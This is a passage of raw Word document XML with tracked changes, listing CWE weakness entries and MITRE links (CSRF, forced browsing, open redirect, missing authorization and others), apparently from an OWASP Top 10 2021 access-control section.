          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://cwe.mitre.org/data/definitions/285.html)</w:t>
      </w:r>
      <w:ins w:id="554" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="21D5519E" w14:textId="0A681A64" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="555" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="556" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="557" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-352: Cross-Site Request Forgery (CSRF</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>)](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/352.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0FA8DE5D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="558" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="559" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-359: Exposure of Private Personal Information to an Unauthorized </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Actor](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/359.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5C673F98" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="560" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="561" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-377: Insecure Temporary </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>File](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/377.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7FFF91B1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="562" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="563" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak'</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https://cwe.mitre.org/data/definitions/402.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0A852D96" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="564" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="565" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-425: Direct Request ('Forced Browsing'</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https://cwe.mitre.org/data/definitions/425.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="323297C1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="566" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="567" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-441: Unintended Proxy or Intermediary ('Confused Deputy'</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https://cwe.mitre.org/data/definitions/441.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="59F48CCC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="568" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="569" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-497: Exposure of Sensitive System Information to an Unauthorized Control </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Sphere](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/497.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="15CA451B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="570" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="571" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-538: Insertion of Sensitive Information into Externally-Accessible File or </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Directory](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/538.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0BC9CBDE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="572" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="573" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-540: Inclusion of Sensitive Information in Source </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Code](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/540.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="579EB9D2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="574" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="575" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-548: Exposure of Information Through Directory </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Listing](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/548.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7F4B93A3" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="576" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="577" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-552: Files or Directories Accessible to External </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Parties](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/552.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="116BD911" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="578" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="579" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t xml:space="preserve">- [CWE-566: Authorization Bypass Through User-Controlled SQL Primary </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Key](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/566.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="71731699" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="580" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="581" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-601: URL Redirection to Untrusted Site ('Open Redirect'</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https://cwe.mitre.org/data/definitions/601.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6736D8FA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="582" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [CWE-639: Authorization Bypass Through User-Controlled </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Key](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://cwe.mitre.org/data/definitions/639.html)</w:t>
      </w:r>
      <w:ins w:id="583" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="56C92D6B" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="584" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="585" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [PortSwigger: Exploiting CORS misconfiguration](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3E2ED027" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="586" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="587" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-651: Exposure of WSDL File Containing Sensitive </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Information](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/651.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="24F44023" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="588" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="589" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-668: Exposure of Resource to Wrong </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Sphere](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/668.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="494D3BA2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="590" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="591" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-706: Use of Incorrectly-Resolved Name or </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Reference](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/706.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="32F5832E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="592" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="593" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-862: Missing </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Authorization](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/862.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0FB64093" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="594" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="595" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-863: Incorrect </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Authorization](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/863.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5DD7F81B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="596" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="597" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-913: Improper Control of Dynamically-Managed Code </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
